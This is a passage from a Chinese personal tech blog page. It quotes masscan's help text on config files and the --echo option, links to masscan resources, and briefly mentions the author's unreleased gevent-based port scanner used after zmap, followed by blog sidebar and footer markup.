All single-dash <span class="keyword">parameters</span> have a spelled <span class="keyword">out</span> <span class="keyword">double</span>-dash equivalent,
so <span class="string">'-p80'</span> <span class="keyword">is</span> the same <span class="keyword">as</span> <span class="string">'--ports 80'</span> (<span class="keyword">or</span> <span class="string">'ports = 80'</span> <span class="keyword">in</span> config <span class="keyword">file</span>).
<span class="keyword">To</span> <span class="keyword">use</span> the config <span class="keyword">file</span>, <span class="keyword">type</span>:
 masscan -<span class="keyword">c</span> &lt;filename&gt;
<span class="keyword">To</span> generate a config-<span class="keyword">file</span> <span class="keyword">from</span> the <span class="keyword">current</span> <span class="keyword">settings</span>, <span class="keyword">use</span> the <span class="comment">--echo</span>
<span class="keyword">option</span>. This stops the program <span class="keyword">from</span> actually running, <span class="keyword">and</span> just echoes
the <span class="keyword">current</span> configuration instead. This <span class="keyword">is</span> a useful way <span class="keyword">to</span> generate
your <span class="keyword">first</span> config <span class="keyword">file</span>, <span class="keyword">or</span> see a <span class="keyword">list</span> <span class="keyword">of</span> <span class="keyword">parameters</span> you didn<span class="string">'t know
about. I suggest you try it now:
 masscan -p1234 --echo</span></span>
</code></pre><p><a href="https://github.com/robertdavidgraham/masscan" target="_blank" rel="external">Masscan github页面</a><br><a href="http://blog.erratasec.com/2013/09/masscan-entire-internet-in-3-minutes.html" target="_blank" rel="external">Masscan: the entire Internet in 3 minutes </a></p>
<h2 id="自制扫描器">自制扫描器</h2><p>没啥好说的，拿这gevent写啊……暂时不开源。通常我先用zmap扫端口，然后送给自己的扫描器去扫。</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    

  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><a class="extend next" rel="next" href="/page/7/"><i class="fa fa-angle-right"></i></a>
  </nav>



        </div>

        


        

      </div>

      
        
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel  sidebar-panel-active ">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" src="/images/default_avatar.jpg" alt="Liu Yuyang" itemprop="image"/>
          <p class="site-author-name" itemprop="name">Liu Yuyang</p>
        </div>
        <p class="site-description motion-element" itemprop="description">我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。</p>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">173</span>
              <span class="site-state-item-name">日志</span>
            </a>
          </div>

          <div class="site-state-item site-state-categories">
            <a href="/categories">
              <span class="site-state-item-count">23</span>
              <span class="site-state-item-name">分类</span>
              </a>
          </div>

          <div class="site-state-item site-state-tags">
            <a href="/tags">
              <span class="site-state-item-count">60</span>
              <span class="site-state-item-name">标签</span>
              </a>
          </div>

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/reverland" target="_blank">
                  
                    <i class="fa fa-github"></i> GitHub
                  
                </a>
              </span>
            
          
        </div>

        
        

        <div class="links-of-author motion-element">
          
            <p class="site-author-name">Links</p>
            
              <span class="links-of-author-item">
                <a href="http://reverland.bitbucket.org/" target="_blank">曾经的的vimwiki</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://liutos.github.com/" target="_blank">Liutos</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://blog.phoenixlzx.com/" target="_blank">凤凰君</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://gndrive.org/" target="_blank">高达数字实验室</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://www.cherrot.com/" target="_blank">Cherrot</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://xwyam.github.com/" target="_blank">xw_y_am</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://ishell.me" target="_blank">小东</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://blog.kochiya.me/" target="_blank">AS酱</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://blog.skydark.info/" target="_blank">skydark</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://thorb.cn/" target="_blank">thorb</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://www.suzibin.cn/" target="_blank">doug</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://armsword.com/" target="_blank">armsword</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://zhangwenli.com/blog" target="_blank">Ovilia</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://lilydjwg.is-programmer.com/" target="_blank">仙子</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://gaohaoyang.github.io" target="_blank">HYG</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://simmer-jun.github.io" target="_blank">Simmer</a>
              </span>
            
          
        </div>

      </section>

      

    </div>
  </aside>


      
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy;  2011 - 
  <span itemprop="copyrightYear">2015</span>
  <span class="with-love">
    <i class="icon-next-heart fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Liu Yuyang</span>
</div>

<div class="powered-by">
  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT
  </a>
</div>



      </div>
    </footer>

    <div class="back-to-top"></div>
  </div>

  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>

  
  

  
    
    

  

    <script type="text/javascript">
      var disqus_shortname = 'reverlandblog';
      var disqus_identifier = 'page/6/index.html';
      var disqus_title = '';
      var disqus_url = '';

      function run_disqus_script(disqus_script){
        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
      }

      run_disqus_script('count.js');
      
    </script>
  


  

  
  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.2"></script>


  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.2"></script>
  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
<script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>

<script type="text/javascript" src="/js/motion.js?v=0.4.5.2" id="motion.global"></script>


  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  

  <script type="text/javascript" src="/js/bootstrap.js"></script>

  
  
  <script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
  </script>

  <script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
      var all = MathJax.Hub.getAllJax(), i;
      for (i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';
      }
    });
  </script>

  
    <script type="text/javascript" src="http://cdn.staticfile.org/mathjax/2.4.0/MathJax.js"></script>
    <script type="text/javascript" src="http://cdn.staticfile.org/mathjax/2.4.0/config/TeX-AMS-MML_HTMLorMML.js"></script>
  


  
  

</body>
</html>
